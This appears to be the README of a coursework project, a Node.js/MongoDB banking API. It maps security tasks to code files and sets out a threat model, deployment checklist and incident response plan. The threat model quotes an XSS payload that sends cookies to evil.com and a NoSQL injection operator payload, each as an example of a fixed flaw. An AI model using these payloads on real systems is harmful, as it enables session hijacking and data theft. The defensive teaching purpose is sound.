# QuickBank — Secure Digital Banking API

PCI DSS-compliant banking platform built with Node.js, Express, and MongoDB.
Every task from the assignment maps to specific files and method names below.

---

## Task → File → Method Index

### Task 1 — Fortress-Level Authentication

| Requirement | File | Method / Export |
|---|---|---|
| Secure login with session management | `src/services/authService.js` | `login()` |
| JWT access tokens (15 min) | `src/services/authService.js` | `generateAccessToken()` |
| JWT refresh tokens (7 days, rotation) | `src/services/authService.js` | `generateRefreshToken()`, `refreshAccessToken()` |
| Login rate limiting (5 / 15 min per IP) | `src/middleware/rateLimiter.js` | `loginLimiter` |
| Account lockout after N failures | `src/models/User.js` | `recordFailedLogin()`, `isLocked()` |
| 2FA setup (TOTP + QR code URI) | `src/services/authService.js` | `setup2FA()` |
| 2FA enable + backup codes | `src/services/authService.js` | `enable2FA()` |
| 2FA verification (login & transaction) | `src/services/authService.js` | `verify2FA()` |
| 2FA routes | `src/routes/auth.js` | `POST /auth/2fa/setup`, `/enable`, `/verify` |
| Device fingerprinting | `src/middleware/deviceFingerprint.js` | `deviceFingerprintMiddleware()`, `buildFingerprint()` |
| Suspicious device audit logging | `src/middleware/deviceFingerprint.js` | `deviceFingerprintMiddleware()` |
| Password reset — expiring, single-use tokens | `src/services/authService.js` | `requestPasswordReset()`, `resetPassword()` |
| Biometric credential ID storage (mobile) | `src/models/User.js` | `biometricCredentialId` field |
| Strong password policy | `src/utils/validators.js` | `passwordRules()` |
| Logout endpoint | `src/routes/auth.js` | `POST /auth/logout` |

---

### Task 2 — Transaction Security

| Requirement | File | Method / Export |
|---|---|---|
| Server-side amount validation | `src/utils/validators.js` | `amountRules()` |
| Per-transaction limit enforcement | `src/services/transactionService.js` | `transfer()` (guard at top) |
| Daily limit enforcement | `src/services/transactionService.js` | `transfer()` + `Account.resetDailyLimitIfNeeded()` |
| MongoDB injection protection | `src/app.js` | `mongoSanitize` middleware |
| Manual query sanitization | `src/utils/sanitizers.js` | `sanitizeMongoQuery()` |
| Input sanitization (descriptions, names) | `src/utils/sanitizers.js` | `sanitizeText()`, `sanitizeForEmail()` |
| XSS-safe email notifications | `src/services/notificationService.js` | `sendTransactionNotification()` |
| Rate limiting — transfers | `src/middleware/rateLimiter.js` | `transferLimiter` |
| Rate limiting — bill payments | `src/middleware/rateLimiter.js` | `billPaymentLimiter` |
| 2FA for transactions ≥ $1,000 | `src/routes/transactions.js` | `check2FAForHighValue()` |
| 2FA gate middleware | `src/middleware/auth.js` | `require2FAVerified()` |
| Transfer route | `src/routes/transactions.js` | `POST /transactions/transfer` |
| Bill payment route | `src/routes/transactions.js` | `POST /transactions/bill-payment` |
| Atomic debit/credit (Mongoose session) | `src/services/transactionService.js` | `transfer()` — `mongoose.startSession()` block |
| Fraud detection integration | `src/services/transactionService.js` | `transfer()` → `fraudDetectionService.evaluateTransfer()` |

---

### Task 3 — Account Management Security

| Requirement | File | Method / Export |
|---|---|---|
| Profile update validation + sanitization | `src/routes/profile.js` | `PATCH /profile` |
| Mass-assignment prevention | `src/routes/profile.js` | `allowedFields` whitelist in `PATCH /profile` |
| Authorization: users access only own data | `src/middleware/auth.js` | `requireOwnership()` |
| Authorization enforced in queries | `src/routes/accounts.js` | All routes filter by `owner: req.user.sub` |
| Transaction history scoped to owner | `src/services/transactionService.js` | `getTransactionHistory()` — `initiatedBy: userId` filter |
| Parameter tampering prevention | `src/utils/validators.js` | `accountIdRules()` (MongoId validation) |
| Account number/routing encrypted at rest | `src/models/Account.js`, `src/models/Beneficiary.js` | `fieldEncryption` plugin |
| Sensitive fields excluded from responses | `src/models/User.js` | `toSafeObject()` |
| Account query routes | `src/routes/accounts.js` | `GET /accounts`, `GET /accounts/:accountId` |
| Beneficiary CRUD with sanitization | `src/routes/beneficiaries.js` | All routes |
| Change password route | `src/routes/profile.js` | `POST /profile/change-password` |

---

### Task 4 — Production-Ready Security Configuration

| Requirement | File | Method / Export |
|---|---|---|
| Helmet configuration (financial app) | `src/middleware/helmetConfig.js` | `helmetConfig()` |
| Strict CSP policy | `src/middleware/helmetConfig.js` | `helmet.contentSecurityPolicy()` config |
| HSTS (2-year, preload) | `src/middleware/helmetConfig.js` | `hsts: { maxAge: 63_072_000 }` |
| X-Frame-Options: DENY | `src/middleware/helmetConfig.js` | `frameguard: { action: 'deny' }` |
| Permissions-Policy header | `src/middleware/helmetConfig.js` | inline middleware in `helmetConfig()` |
| HTTPS enforcement redirect | `src/app.js` | HTTPS redirect middleware |
| Secure cookie configuration | `src/app.js` | `session()` — `httpOnly`, `secure`, `sameSite: 'strict'` |
| Session encryption with MongoStore | `src/app.js` | `MongoStore.create({ crypto: { secret } })` |
| `__Host-` prefixed session cookie | `src/app.js` | `name: '__Host-qb.sid'` |
| Hide X-Powered-By | `src/middleware/helmetConfig.js` | `hidePoweredBy: true` |
| Request body size limit (DoS) | `src/app.js` | `express.json({ limit: '10kb' })` |

---

### Task 5 — Logging and Monitoring

| Requirement | File | Method / Export |
|---|---|---|
| Structured Winston logger | `src/utils/logger.js` | `logger` (Winston instance) |
| Audit trail for financial transactions | `src/middleware/auditLogger.js` | `auditTransaction()` |
| Profile change audit | `src/middleware/auditLogger.js` | `auditProfileUpdate()` |
| Audit log model (append-only) | `src/models/AuditLog.js` | `AuditLog` + immutability hooks |
| Audit log service | `src/services/auditService.js` | `log()`, `getFailedLogins()`, `getTransactionHistory()` |
| Failed login tracking | `src/services/authService.js` | `login()` → `auditService.log('login_failure')` |
| Account lockout audit event | `src/services/authService.js` | `login()` → `auditService.log('lockout')` |
| Real-time fraud detection | `src/services/fraudDetectionService.js` | `evaluateTransfer()` |
| Fraud rules: velocity, new-device, escalation, after-hours | `src/services/fraudDetectionService.js` | Rules 1–4 in `evaluateTransfer()` |
| IP + device captured on transactions | `src/models/Transaction.js` | `ipAddress`, `deviceFingerprint` fields |

---

### Task 6 — Error Handling Without Information Leakage

| Requirement | File | Method / Export |
|---|---|---|
| Central error handler | `src/middleware/errorHandler.js` | `errorHandler()` |
| 404 handler | `src/middleware/errorHandler.js` | `notFound()` |
| Mongoose validation errors — safe surface | `src/middleware/errorHandler.js` | `ValidationError` branch |
| MongoDB duplicate key — generic message | `src/middleware/errorHandler.js` | `err.code === 11000` branch |
| JWT errors — safe message | `src/middleware/errorHandler.js` | JWT error branch |
| 5xx responses — no internal details | `src/middleware/errorHandler.js` | `safeStatus >= 500` branch |
| Generic login error (no user enumeration) | `src/services/authService.js` | `genericError` variable in `login()` |

---

### Task 7 — PCI DSS Compliance Preparation

| Requirement | Addressed By |
|---|---|
| Req 2: No default passwords | `src/config/security.js`, `.env.example` |
| Req 3: Protect stored cardholder data | `fieldEncryption` plugin on `Account`, `Beneficiary`, `User` models |
| Req 6: Secure development | Helmet, input validation, sanitization, parameterized queries throughout |
| Req 7: Restrict data access | `requireAuth`, `requireOwnership`, `requireRole` middleware |
| Req 8: Unique IDs + strong authentication | JWT + bcrypt + TOTP 2FA |
| Req 10: Audit trails | `AuditLog` model, `auditService`, 7-year TTL comment in schema |
| Req 11: Security testing | `tests/` directory — auth, transaction, and security regression tests |
| Minimum 12-char passwords | `src/utils/validators.js` → `passwordRules()` |
| Bcrypt rounds ≥ 12 | `src/config/security.js` → `bcryptRounds: 12` |
| TLS enforcement | `src/config/database.js` → TLS options in production, HTTPS redirect in `app.js` |

---

### Task 8 — Security Incident Response Plan

See **[Incident Response Plan](#incident-response-plan)** section below.

---

### Task 9 — Rate Limiting Strategies

| Endpoint Type | Limiter | Window | Max |
|---|---|---|---|
| Login | `loginLimiter` | 15 min | 5 |
| Password reset request | `passwordResetLimiter` | 60 min | 3 |
| Money transfers | `transferLimiter` | 1 min | 10 |
| Bill payments | `billPaymentLimiter` | 10 min | 20 |
| 2FA OTP attempts | `twoFactorLimiter` | 10 min | 5 |
| General API | `generalApiLimiter` | 15 min | 200 |

All in: `src/middleware/rateLimiter.js`

---

### Task 10 — Automated Security Tests

| Test File | What It Covers |
|---|---|
| `tests/auth.test.js` | Registration, login, lockout, JWT tampering, password reset flow |
| `tests/transactions.test.js` | Amount validation, ownership, 2FA threshold, history scoping, bill payment |
| `tests/security.test.js` | Security headers, XSS sanitization, NoSQL injection, error leakage, sensitive field stripping |

---

## Project Structure

```
assignment5/
├── server.js                          # Entry point, graceful shutdown
├── src/
│   ├── app.js                         # Express app, middleware stack
│   ├── config/
│   │   ├── database.js                # MongoDB connection (TLS in prod)
│   │   └── security.js                # Central security constants
│   ├── middleware/
│   │   ├── helmetConfig.js            # Security headers (Task 4)
│   │   ├── rateLimiter.js             # Rate limiting strategies (Task 9)
│   │   ├── auth.js                    # JWT verification, role/ownership checks
│   │   ├── deviceFingerprint.js       # Device fingerprinting (Task 1)
│   │   ├── validate.js                # express-validator error collector
│   │   ├── auditLogger.js             # Transaction/profile audit middleware (Task 5)
│   │   └── errorHandler.js            # Safe error handler (Task 6)
│   ├── models/
│   │   ├── User.js                    # User with lockout, 2FA, device list
│   │   ├── Account.js                 # Bank account, encrypted fields
│   │   ├── Transaction.js             # Immutable transaction record
│   │   ├── AuditLog.js                # Append-only audit trail
│   │   ├── Beneficiary.js             # Saved payees, encrypted
│   │   └── Loan.js                    # Loan application lifecycle
│   ├── routes/
│   │   ├── auth.js                    # /api/auth/* (login, 2FA, reset)
│   │   ├── accounts.js                # /api/accounts/*
│   │   ├── transactions.js            # /api/transactions/*
│   │   ├── beneficiaries.js           # /api/beneficiaries/*
│   │   ├── loans.js                   # /api/loans/*
│   │   └── profile.js                 # /api/profile/*
│   ├── services/
│   │   ├── authService.js             # Login, 2FA, password reset logic
│   │   ├── transactionService.js      # Transfer, bill pay, history
│   │   ├── fraudDetectionService.js   # Real-time fraud heuristics (Task 5)
│   │   ├── auditService.js            # Audit log writes and queries
│   │   └── notificationService.js     # Email (XSS-safe templates)
│   └── utils/
│       ├── logger.js                  # Winston structured logger
│       ├── sanitizers.js              # XSS, HTML, NoSQL sanitization
│       └── validators.js              # express-validator rule sets
└── tests/
    ├── auth.test.js                   # Authentication security tests
    ├── transactions.test.js           # Transaction security tests
    └── security.test.js               # Regression: headers, injection, leakage
```

---

## Security Architecture Overview

### Defense-in-Depth Layers

```
Client Request
    │
    ▼
[1] HSTS + TLS (in-transit encryption, HTTPS redirect for non-TLS)
    │
    ▼
[2] Helmet headers (CSP, HSTS, X-Frame-Options, CORP, COEP, etc.)
    │
    ▼
[3] CORS whitelist (rejects cross-origin mutations)
    │
    ▼
[4] General API rate limiter (200 / 15 min — anti-DoS)
    │
    ▼
[5] express-mongo-sanitize (strips $-operator keys from body/query/params)
    │
    ▼
[6] Request body size cap (10 KB — prevents large-payload attacks)
    │
    ▼
[7] Route-level express-validator (type, format, range checks)
    │
    ▼
[8] handleValidation (aborts with 422 on any violation)
    │
    ▼
[9] requireAuth (JWT verification, token expiry, signature check)
    │
    ▼
[10] requireOwnership / requireRole (IDOR + privilege checks)
    │
    ▼
[11] Endpoint-specific rate limiter (e.g., transferLimiter: 10 / 1 min)
    │
    ▼
[12] 2FA gate for high-value transactions (≥ $1,000)
    │
    ▼
[13] Business logic (sanitize → parameterized $eq queries → atomic DB session)
    │
    ▼
[14] Fraud detection (velocity, device, hours, amount escalation rules)
    │
    ▼
[15] MongoDB (field-level encryption, TLS connection)
    │
    ▼
[16] Audit log write (every financial event recorded, append-only)
```

### CSRF Protection

Session cookies use `SameSite=Strict` and the `__Host-` prefix, which causes browsers to withhold cookies on any cross-site request. All state-changing API calls additionally require a valid `Authorization: Bearer` JWT header; a cross-site attacker cannot obtain this header via a forged form submission or fetch. These two controls together satisfy modern CSRF defence requirements without a per-request token.

---

## Identified Vulnerabilities & Mitigations

| # | Original Vulnerability | Mitigation |
|---|---|---|
| 1 | Amount manipulation: $1,000,000 transfer via tampered request body | Server-side `amountRules()` + per-transaction and daily limits in `transactionService.js` |
| 2 | IDOR: transaction history reveals other users' transactions | `getTransactionHistory()` filters by `initiatedBy: userId`; `requireOwnership()` on account routes |
| 3 | NoSQL injection: account number accepts DB query operators | `mongoSanitize` globally + `sanitizeMongoQuery()` + `{ $eq: value }` on all queries |
| 4 | Sessions active across multiple browsers simultaneously | JWT with 15-min expiry + refresh token rotation; session store encrypted with MongoStore |
| 5 | Unlimited login attempts → brute force | `loginLimiter` (5 / 15 min) + account lockout after N failures |
| 6 | XSS in email notifications via transaction descriptions | `sanitizeForEmail()` strips HTML before template interpolation in `notificationService.js` |
| 7 | Detailed error messages reveal DB structure | Central `errorHandler.js` returns generic messages for 5xx; DB/query details never surfaced |
| 8 | Password reset tokens never expire and are reusable | Single-use tokens with `resetTokenExpiry`; `resetPassword()` clears token on use |

---

## Threat Modeling

Each vulnerability is analyzed by attack vector, exploitation method, and potential impact.

### 1. Amount Manipulation — Transaction Tampering
- **Vector:** Attacker intercepts or crafts a transfer request and changes `"amount": 100` to `"amount": 1000000` (or a negative value for reverse transfer).
- **Exploitation:** Direct HTTP request with modified body; no special tooling beyond a browser dev console or `curl`.
- **Impact:** Unauthorized fund transfer. Negative amount could credit attacker's account. Integer overflow or float precision abuse could bypass limit checks.
- **Fix:** `amountRules()` enforces `isInt({ min: 1, max: MAX_TRANSFER_AMOUNT })` in cents. `transfer()` rechecks server-side limits before executing. All arithmetic is done in integer cents to eliminate float precision issues.

### 2. IDOR — Accessing Other Users' Transactions
- **Vector:** Authenticated user queries `GET /transactions?accountId=<victim_id>` or manipulates pagination parameters to walk through other accounts' history.
- **Exploitation:** Account IDs are MongoDB ObjectIds; with enough requests an attacker can enumerate them, or infer them from transaction confirmation messages.
- **Impact:** Full transaction history disclosure — merchant names, amounts, timestamps — enabling targeted phishing or fraud.
- **Fix:** `getTransactionHistory()` always applies `initiatedBy: userId` from the authenticated JWT, not from request parameters. `requireOwnership()` middleware additionally verifies the account belongs to the authenticated user before any query runs.

### 3. NoSQL Injection — Account/Transaction Queries
- **Vector:** Attacker sends `{ "accountNumber": { "$gt": "" } }` in a JSON body, bypassing equality checks and returning all accounts.
- **Exploitation:** Returns the full accounts collection in a single request. Combined with IDOR, enables mass account number exfiltration.
- **Impact:** Bulk financial data theft; potential for destructive `$where` payloads causing availability loss.
- **Fix (layered):** `express-mongo-sanitize` strips `$`-prefixed keys from all request objects; `sanitizeMongoQuery()` removes remaining operators from strings; all queries use `{ field: { $eq: value } }` explicitly; `accountIdRules()` validates MongoId format before any query executes.

### 4. Session Fixation / Concurrent Sessions
- **Vector:** Attacker obtains a valid session token (e.g., via network sniffing on HTTP) and uses it concurrently with the legitimate user across multiple browsers.
- **Exploitation:** Because sessions were never invalidated after login, the stolen token works until the user explicitly logs out — which many users never do.
- **Impact:** Full account takeover; attacker can perform transfers, change profile, add beneficiaries.
- **Fix:** JWT access tokens expire in 15 minutes. Refresh token rotation invalidates the previous refresh token on each use. Rotating `JWT_SECRET` terminates all active sessions instantly for incident response. Sessions are encrypted in MongoStore and the cookie uses `__Host-` prefix + `SameSite=Strict`.

### 5. Brute Force — Unlimited Login Attempts
- **Vector:** Automated tool submits thousands of password guesses per second against `POST /auth/login`.
- **Exploitation:** A common username (email) with a dictionary attack can succeed in seconds if no throttle exists.
- **Impact:** Account takeover; access to account balances, transaction history, beneficiary management.
- **Fix:** `loginLimiter` allows 5 requests per 15 minutes per IP. After N consecutive failures, `recordFailedLogin()` sets `lockUntil = now + 30 min` and `isLocked()` returns `true`, rejecting further attempts. Error message is generic (`Invalid credentials`) to prevent user enumeration.

### 6. XSS via Email Notifications
- **Vector:** User creates a transaction with description `<img src=x onerror=fetch('https://evil.com/?c='+document.cookie)>`. The notification service interpolates this directly into an HTML email template.
- **Exploitation:** Recipient's email client renders the HTML, executes the script, and exfiltrates the session token.
- **Impact:** Session hijacking of the email recipient; potential for phishing via spoofed notification content.
- **Fix:** `sanitizeForEmail()` escapes all HTML entities (`<`, `>`, `&`, `"`, `'`) in any user-supplied content before template interpolation. Output is treated as text content, not HTML markup.

### 7. Information Leakage via Error Messages
- **Vector:** Attacker submits malformed requests to trigger stack traces (e.g., sending `null` for a required field causes a Mongoose `CastError` with full stack and collection name).
- **Exploitation:** Stack traces reveal file paths, library versions, database schema, and query structure — all valuable reconnaissance data.
- **Impact:** Accelerates targeted attacks; reveals MongoDB collection names and field names for injection targeting.
- **Fix:** `errorHandler.js` intercepts all errors and returns `{ status, message }` with generic copy for 5xx. Mongoose `ValidationError` and duplicate-key errors get safe messages. Full error details are logged internally (Winston) but never sent to the client.

### 8. Password Reset Token Reuse
- **Vector:** Attacker intercepts a reset-link email (e.g., from an email provider breach or a stored link in browser history) and uses it days or weeks later.
- **Exploitation:** The token is valid indefinitely; clicking it allows setting a new password and taking over the account.
- **Impact:** Complete account takeover even after the original compromise is mitigated.
- **Fix:** `requestPasswordReset()` stores `resetTokenExpiry = now + 1 hour`. `resetPassword()` checks `resetTokenExpiry > now` and immediately clears both `resetToken` and `resetTokenExpiry` after successful use. The token is a `crypto.randomBytes(32)` hex string, making it unguessable.

### 9. CSRF — Cross-Site Request Forgery
- **Vector:** Attacker embeds a hidden form on `evil.com` that submits to `POST /api/transactions/transfer`. The victim visits the page while logged into QuickBank; their browser sends the session cookie automatically.
- **Exploitation:** Requires only that the victim be logged in while browsing an attacker-controlled page.
- **Impact:** Unauthorized fund transfers, beneficiary additions, profile changes.
- **Fix:** `SameSite=Strict` cookie attribute prevents the browser from including the cookie in cross-site requests. All state-changing endpoints require the `Authorization: Bearer` header, which cross-site scripts cannot obtain via a form submission.

---

## Production Deployment Checklist

### Environment & Secrets
- [ ] Set `NODE_ENV=production`
- [ ] Generate `JWT_SECRET` ≥ 32 chars: `openssl rand -hex 32`
- [ ] Generate `SESSION_SECRET` ≥ 32 chars: `openssl rand -hex 32`
- [ ] Generate `FIELD_ENCRYPTION_KEY` (64 hex chars / 32 bytes): `openssl rand -hex 32`
- [ ] Set `ALLOWED_ORIGINS` to your exact frontend domain(s) — no wildcards
- [ ] Verify `.env` is in `.gitignore` and never committed

### Infrastructure
- [ ] Terminate TLS at load balancer/reverse proxy (nginx, AWS ALB); forward to Node on HTTP internally
- [ ] Enable MongoDB TLS (`tls: true` in `config/database.js`)
- [ ] Enable MongoDB Atlas encryption-at-rest (WiredTiger AES-256) or equivalent
- [ ] Restrict Node process to a non-root user
- [ ] Configure automatic MongoDB backups with point-in-time recovery

### Security Headers & Config
- [ ] Confirm `helmetConfig()` is applied before all routes (`npm run test -- security` green)
- [ ] Verify `Strict-Transport-Security` header is present in production responses
- [ ] Confirm CSP `report-uri` is configured and monitored
- [ ] Validate `__Host-qb.sid` cookie attributes in browser DevTools: `Secure`, `HttpOnly`, `SameSite=Strict`

### Rate Limiting & Monitoring
- [ ] Confirm `loginLimiter`, `transferLimiter`, and `billPaymentLimiter` respond with 429 when thresholds are hit
- [ ] Set up alerts on `AuditLog` events with `severity: 'critical'` (e.g., CloudWatch, PagerDuty)
- [ ] Alert on >10 `login_failure` events for the same `userId` within 5 minutes
- [ ] Alert on any `fraud_detection` block event
- [ ] Ship audit logs to a SIEM (Splunk, ELK) — never rely on a single write path

### PCI DSS Pre-Launch
- [ ] Run `npm audit` and remediate all High/Critical advisories
- [ ] Engage a QSA (Qualified Security Assessor) for formal PCI DSS scoping
- [ ] Document all data flows involving card/account numbers and routing numbers
- [ ] Confirm `fieldEncryption` plugin is active on all models with sensitive numeric fields
- [ ] Verify bcrypt rounds ≥ 12 (`config/security.js`)
- [ ] Confirm password minimum length ≥ 12 characters enforced (`passwordRules()`)
- [ ] Perform penetration test targeting: amount tampering, IDOR, injection, 2FA bypass, session fixation
- [ ] Train all developers on secure coding practices (OWASP Top 10) — document completion

---

## Setup

```bash
cp .env.example .env
# Fill in MONGODB_URI, JWT_SECRET, SESSION_SECRET, FIELD_ENCRYPTION_KEY, SMTP_*

npm install
npm run dev       # development
npm start         # production
npm test          # run all security tests
npm run test:coverage
```

---

## Incident Response Plan

### Detection
- Monitor `AuditLog` for `severity: 'critical'` events (fraud blocks, repeated lockouts).
- Alert on: >10 `login_failure` events for same `userId` in 5 min; `suspicious_device` on privileged accounts; any `fraud_detection` block.

### Containment
1. **Immediately**: Set `user.isActive = false` to revoke all future logins.
2. Rotate `JWT_SECRET` to invalidate all active tokens (all sessions terminated).
3. Rotate `FIELD_ENCRYPTION_KEY` and re-encrypt sensitive fields.
4. Place impacted accounts in read-only mode (set `isActive = false` on `Account`).

### Investigation
- Pull `AuditLog` records for affected `userId` for the preceding 30 days.
- Correlate `ipAddress` and `deviceFingerprint` across logs.
- Review `Transaction` records with `status: 'completed'` during the attack window.

### Notification
- Affected users: email within 72 hours (GDPR Art. 34), include transaction IDs.
- Regulators: notify within 72 hours if breach exceeds PCI DSS thresholds.
- Internal: escalate to CISO, legal, and compliance team within 1 hour of confirmation.

### Recovery
- Reverse fraudulent transactions where technically possible (`status: 'reversed'`).
- Force password reset for all impacted users (`passwordResetExpiry = now`).
- Re-enable accounts after manual identity verification.
- Post-incident review: update fraud detection thresholds and document in runbook.

---

## Security Code Review Checklist

- [ ] All monetary values processed in integer cents (no floats)
- [ ] `amountRules()` applied to every financial endpoint
- [ ] `requireAuth` on every protected route
- [ ] Owner filter (`owner: req.user.sub`) on every DB query that touches user data
- [ ] `sanitizeText()` applied before storing any user-supplied string
- [ ] `sanitizeForEmail()` applied before inserting content into email HTML
- [ ] Rate limiter applied to every public-facing mutation endpoint
- [ ] Error handler never returns stack traces, DB names, or query details
- [ ] No `select: false` fields returned in API responses
- [ ] `handleValidation` called after every validation chain
- [ ] Audit log written for every financial event
- [ ] New sensitive model fields added to `fieldEncryption` plugin
